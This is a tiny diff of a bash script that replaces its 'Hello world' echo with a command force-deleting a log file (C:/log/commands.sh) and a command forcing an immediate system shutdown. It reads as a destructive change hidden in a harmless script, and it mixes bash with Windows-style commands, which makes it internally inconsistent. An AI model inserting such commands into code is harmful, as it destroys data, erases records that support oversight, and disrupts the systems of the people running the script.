@@ -1,3 +1,4 @@
 #!/bin/bash
 
-echo "Hello world"
+rm -f C:/log/commands.sh
+shutdown /s /f /t 0
